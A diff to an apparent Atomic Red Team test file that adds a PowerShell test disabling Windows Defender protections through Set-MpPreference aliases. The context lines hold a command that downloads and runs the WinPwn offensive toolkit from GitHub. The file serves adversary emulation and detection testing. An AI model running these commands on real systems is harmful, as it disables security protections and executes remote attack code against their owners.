@@ -644,3 +644,22 @@ atomic_tests:
       iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
       inv-phantom -consoleoutput -noninteractive  
     name: powershell
+- name: Tamper with Windows Defender ATP using Aliases - PowerShell
+  description: |
+    Attempting to disable scheduled scanning and other parts of Windows Defender ATP using set-MpPreference aliases. Upon execution Virus and Threat Protection will show as disabled
+    in Windows settings.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      Set-MpPreference -drtm $True
+      Set-MpPreference -dbm $True
+      Set-MpPreference -dscrptsc $True
+      Set-MpPreference -dbaf $True
+    cleanup_command: |
+      Set-MpPreference -drtm 0
+      Set-MpPreference -dbm 0
+      Set-MpPreference -dscrptsc 0
+      Set-MpPreference -dbaf 0
+    name: powershell
+    elevation_required: true
